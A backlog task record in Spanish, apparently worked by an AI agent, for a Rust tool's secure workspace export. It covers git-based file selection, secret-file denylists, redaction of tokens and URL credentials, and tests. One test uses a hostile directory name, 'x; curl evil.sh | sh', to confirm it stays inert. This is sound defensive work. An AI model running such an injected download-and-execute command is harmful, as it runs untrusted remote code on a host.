---
id: TASK-28
title: '[MH-A05] Preparar workspaces y comandos sin transportar secretos del host'
status: Done
assignee:
  - '@claude'
created_date: '2026-11-18T11:50:00Z'
updated_date: '2026-11-19T00:44:00Z'
labels:
  - audit-v0.2
  - security
  - workspace
  - p0
dependencies: []
references:
  - crates/hodei-mh/src/profile_run.rs
  - crates/hodei-mh-workspace/src/git.rs
  - crates/hodei-mh-profiles/src/credentials.rs
  - crates/hodei-mh-supervisor/src/provenance.rs
priority: high
ordinal: 28000
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
P0. profile_run.rs:106-121 interpola proxy en shell del host; :199-210 empaqueta todo, incluidas rutas ignoradas; :511-521 guarda comando y redacta solo tras truncar salida. Reusar workspace Git, exportación explícita de cambios autorizados, argv/URL tipada y redacción única basada en valores secretos conocidos y patrones. Usar temporales privados. TASK-2/8/16/19. No confiar en gitignore como detector universal; política de exportación explícita y secreto conocido excluido aunque esté versionado. No añadir un gestor de secretos paralelo.
Revisión de referencia: 3d33f85a63bc59a7e814f5f205e546758c943b61.
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [x] #1 URL/proyecto con caracteres especiales no ejecuta comandos host inesperados; URL con credenciales no aparece en argv/logs.
- [x] #2 El snapshot excluye secretos ignorados, .git y caches por defecto; cambios no versionados solo se exportan con política explícita.
- [x] #3 Redacción antes de truncar/persistir protege tokens conocidos, URL y salida estructurada conservando estructura.
- [x] #4 Un fixture local con secretos sintéticos comprueba el artefacto y logs sin proveedor LLM.
<!-- AC:END -->

## Implementation Plan

<!-- SECTION:PLAN:BEGIN -->
1. AC-2 Staging del workspace (workspace::plan = dueño del denylist): nueva selección pura de ficheros a exportar select_files_for_export(tracked, untracked, policy, denylist) -> niega .git/caches/secreto_conocido_aunque_versionado, y solo añade no-versionados con politica explícita. profile_run reemplaza tar_project(.) por tar de la lista explícita: git ls-files (tracked) + git ls-files --others --exclude-standard (solo con --export-untracked); para dir no-git, walk excluyendo .git/denylist/caches.
2. AC-3 Redaccion ANTES de truncar/persistir (profiles::credentials = dueño de redaccion): redactar el comando ejecutado y la salida COMPLETA antes de tomar el tail; el chequeo de leaks corre sobre los strings crudos aparte. Cerrar hueco de URL con token como username sin colon (https://ghp_x@host) en redact_url_credentials.
3. AC-1 Prueba enfocada: proyecto con metacarácteres y URL con credenciales -> argv/log no ejecutan comando host ni muestran credencial (proxy_address canónico ya lo garantiza; añadir regresión).
4. AC-4 Fixture local sin LLM con secretos sintéticos (.env/*.key versionados + secreto en salida de build) -> artefacto exportado y logs sin proveedor; comprobar que el snapshot y el registro no los contienen.
5. Puerta local: cargo fmt, clippy -D warnings, fast-check --packages hodei-mh,hodei-mh-workspace,hodei-mh-profiles, tests nuevos.

REVISION GOLDISH (2 revisores): fix MAJOR -> (a) el chequeo de leaks debe leer de los strings CRUDOS guardados aparte (hoy se deriva del record; redactar antes cegaria el detector); (b) git ls-files SIEMPRE -z y via git.rs (unico dueno CLI), no split por lineas; (c) caches/.git excluidos via EXPORT_DENYLIST en workspace::plan (no ensanar DEFAULT_DENYLIST de promote; anadir regla prefijo .env* a matches_rule); (d) temporales privados 0700 (tgz y export dir, nombres predecibles hoy); (e) lista vacia vs todo-denegado: mensajes y codigo distintos, tar con --null -T - via stdin (ARG_MAX) y --; (f) record: project_export {policy,source,files_exported,denied[]} tambien en candidate.json; (g) redact_url_credentials: delimitar authority (sin '@' infinito ni break que aborta URLs posteriores), redactar userinfo sin dos-puntos; y redaction de prefijos de token (ghp_, sk-ant-...) para cerrar asimetria deteccion/redaccion. No unificar provenance/rollover redactors (fuera de alcance; nota de drift para TASK-34). Mismo hazard tar en 5 sondas hermanas: fuera de alcance, nota en handoff.

GOLDFISH C (hallazgos aceptados, entran en la implementacion): (1) BLOCKER git ls-files camina al repo PADRE si project_dir es subdirectorio de otro repo -> exigir rev-parse --show-toplevel == project_dir; si no, tree-walk (fuente honesta en record). (2) gitlinks/submodulos y paths del index sin worktree: filtrar cada entrada por symlink_metadata (solo file|symlink; si no, denegada rule not-a-regular-file). (3) AKIA/ASIA detectados pero NO redactados + user:pass@ sin scheme (scp-style git): anadirredaccion de AWS key ids y userinfo con dos-puntos fuera de ://; reescribir redact_url_credentials con authority DELIMITADA (sin '@' infinito, sin break que aborta URLs posteriores) y userinfo sin colon redactada (ghp_x@host). (4) temp privado: dir 0700 unique + tgz pre-creado O_EXCL 0600 (tar truncates, no sigue symlinks), cleanup incondicional; seleccion/packing ANTES de crear sandbox (fallo = nada que limpiar). (5) lista vacia con --null -T produce archive VALIDO vacio (verificado): refusar export vacio explicitamente, distinto de todo-denegado. (6) nombres escritos con prefijo ./ para names arrancon '-' (tar no los trague como opciones). (7) --image con userinfo (no digest) rechazado en spec_for; doctor valida proxy. Token-in-command en main.rs/probes hermanas = follow-up TASK-34, nota handoff.
<!-- SECTION:PLAN:END -->

## Implementation Notes

<!-- SECTION:NOTES:BEGIN -->
Implementacion (esta sesion, sobre el commit 9d7a042): el arbol ya compila (se corrigio el error de E0277 de find(["AKIA","ASIA"]) y el collapsible_if de clippy que el commit anterior dejo roto).

1. crate hodei-mh-workspace: modulo NUEVO export.rs (propietario del empaquetado). stage_project(dir, politica) -> (archivo privado 0700 + tgz 0600 + informe). Clasificacion: si el directorio es la RAIZ de un arbol de trabajo, git decide (ls-files = versionados, diff HEAD = cambios sin versionar, ls-files --others = sin seguimiento); si no, el arbol de ficheros es el proyecto (source=tree_walk). La seleccion la decide plan::select_files_for_export con EXPORT_DENYLIST (git metadata, caches, familia .env, claves, secrets/, credentials/, .ssh/). Los enlaces simbolicos se empaquetan COMO enlaces (nunca se sigue el puntero). Solo se empaquetan ficheros regulares. El tar se escribe con la libreria tar + flate2: la ruta del proyecto deja de ser un argumento de un comando del host (se acabo el tar de la CLI).

2. Politica de exportacion: por defecto solo sale el contenido versionado; los cambios sin versionar (fichero modificado y fichero sin seguimiento) solo salen con --export-untracked. Un directorio que no es raiz de un arbol de trabajo no tiene indice: su arbol entero sale, y el informe dice source=tree_walk.

3. profile_run.rs: la exportacion se decide ANTES de que exista el sandbox (un fallo ahi no deja nada que limpiar). El informe project_export {policy, source, files_exported, denied[]} va en el registro y en candidate.json. La salida se REDACTA ANTES de truncarla (antes se truncaba y despues se redactaba). El detector de fugas lee los comandos CRUDOS guardados aparte: leer el registro ya redactado dejaria ciego al detector.

4. credentials.rs: se cierra la asimetria deteccion/redaccion (userinfo sin dos puntos, scp-style, claves AKIA/ASIA, bloques PEM, prefijos ghp_/sk-ant-) y el placeholder [redacted] deja de confundirse con una credencial.

5. Fixture local (crates/hodei-mh-workspace/tests/export_fixture.rs): 7 pruebas offline con secretos sinteticos que comprueban el ARTEFACTO (los bytes del tar) y el INFORME, sin proveedor LLM ni sandbox.

Evidencia de la puerta local: cargo fmt limpio; cargo clippy --workspace --all-targets -- -D warnings limpio (arreglando tambien el collapsible_if que el commit 9d7a042 dejo en plan.rs); scripts/fast-check.sh PASS; cargo test --workspace en verde (34 binarios de test). El fixture nuevo son 7 pruebas offline en crates/hodei-mh-workspace/tests/export_fixture.rs (artefacto + informe con secretos sinteticos, sin proveedor LLM ni sandbox ni red), 6 en profiles::credentials y 6 en profile_run.

Evidencia de la pista (integracion): scripts/probes.sh contra Docker real y el lifecycle server -> 6/6 PASS (release, supervisor, profile, multiproject, verify, trust), sandboxes=0 containers=0 networks=0. El profile-probe compila el proyecto Rust y el proyecto JVM dentro del sandbox pineado por el camino NUEVO de exportacion (staging + extraccion), y el registro sale con secret_leak_positions_in_commands vacio y el candidato exportado con digest confirmado. PR #38 (merge e84c411), rama task/task-28-workspace-secretless-export.
<!-- SECTION:NOTES:END -->

## Final Summary

<!-- SECTION:FINAL_SUMMARY:BEGIN -->
TASK-28 (MH-A05) cerrada: lo que sale del host es una lista explicita de ficheros, no una copia del arbol de trabajo.

QUE CAMBIA
- hodei-mh-workspace gana el modulo export.rs (propietario del empaquetado). La clasificacion la hace git cuando el directorio es la RAIZ de un arbol de trabajo (el indice voucha lo versionado; diff HEAD dice que ficheros llevan cambio sin versionar; ls-files --others dice lo sin seguimiento). Si no hay indice (un directorio que no es raiz de un arbol, o sin repositorio), el arbol de ficheros es el proyecto y el informe dice source=tree_walk. La seleccion la decide plan::select_files_for_export con EXPORT_DENYLIST: metadata de git, caches (target, node_modules, __pycache__, .venv, .gradle), familia .env, *.pem/*.key/*.p12, id_rsa, id_ed25519, secrets/, credentials/, .ssh/, backlog/, .claude/.
- Un simbolico se empaqueta COMO simbolico (nunca se sigue el puntero) y solo se empaquetan ficheros regulares (un gitlink o un submodule queda denegado con su regla). El tar se escribe con la libreria tar + flate2 en un directorio privado 0700 de nombre impredecible, con el archivo 0600 y O_EXCL; el valor borra el directorio al soltarse.
- Politica: por defecto sale solo el contenido versionado; los cambios sin versionar (fichero modificado y fichero sin seguimiento) salen solo con --export-untracked. El informe project_export {policy, source, files_exported, denied[]} va en el registro y en candidate.json.
- profile_run: la exportacion se decide ANTES de que exista el sandbox (un fallo ahi no deja nada que limpiar); la ruta del proyecto deja de ser el argumento de un comando del host (se acabo el tar de la CLI); la salida de cada comando se redacta ANTES de truncarla; el detector de fugas lee los comandos CRUDOS guardados aparte, porque leer el registro ya redactado dejaria ciego al detector.
- credentials: la redaccion cubre las mismas formas que ve el detector (userinfo sin dos puntos, scp-style, claves AKIA/ASIA, bloques PEM, prefijos ghp_/sk-ant-) y el placeholder [redacted] deja de confundirse con una credencial.
- Una referencia de imagen con userinfo se rechaza en spec_for; la forma name@sha256:<digest> no es una credencial.

VERIFICACION
- Fixture local con secretos SINTETICOS (crates/hodei-mh-workspace/tests/export_fixture.rs, 7 pruebas offline): comprueba el ARTEFACTO (los bytes del tar) y el INFORME, sin proveedor LLM, sin sandbox y sin red. El .env versionado, el directorio secrets/ y la clave privada no viajan; los cambios sin versionar necesitan la politica explicita; un enlace a un secreto del host no lleva su contenido; el informe nombra las denegaciones sin repetir su contenido; un nombre de directorio hostil (x; curl evil.sh | sh) es dato inerte.
- profiles::credentials (6 pruebas nuevas) y profile_run (6 pruebas nuevas): la salida se redacta antes de truncar, el registro conserva su estructura, el detector ve lo crudo, un token como usuario de URL, una referencia scp-style, una clave AWS, un bloque PEM y los prefijos de token quedan fuera; una identidad sin contrasena (git@github.com) no se toca.
- cargo fmt, cargo clippy --workspace --all-targets -- -D warnings y scripts/fast-check.sh PASS; cargo test --workspace en verde (34 binarios).
- Pista de integracion contra Docker real y el lifecycle server: scripts/probes.sh -> 6/6 PASS (release, supervisor, profile, multiproject, verify, trust), sandboxes=0 containers=0 networks=0. El profile-probe compila los proyectos Rust y JVM dentro del sandbox pineado por el camino nuevo de exportacion, con secret_leak_positions_in_commands vacio y el candidato exportado con digest confirmado.
- PR #38, merge e84c411 en main.

DESVIACION CONCRETA (con motivo)
- La revision independente pedia escribir los miembros del tar con prefijo ./ para que un nombre que empieza por - no fuera leido como opcion al extraer. El crate tar normaliza ./x a x, asi que el prefijo no es posible. El riesgo se midio y no se materializa: GNU tar 1.34 (la imagen rust:1-bookworm del perfil) y 1.35 (el host) extraen un miembro llamado -rf como fichero literal, con rc=0 y sin interpretarlo como opcion. Queda anotado por si el extractor cambia.

LIMITES Y CONTINUIDAD
- Un directorio que no es raiz de un arbol de trabajo no tiene indice: su arbol entero sale (source=tree_walk) y el informe lo dice. Es la unica fuente no clasificada por git, y es explicita.
- La politica de exportacion no toca los redactores de provenance ni de rollover (drift conocido, ya anotado para TASK-34). El token en linea de comandos de main.rs y de las sondas hermanas sigue siendo un follow-up de TASK-34.
- La pista de probes solo se ejecuto en este host; el CI la ejecuta en main (job probe lane).
<!-- SECTION:FINAL_SUMMARY:END -->
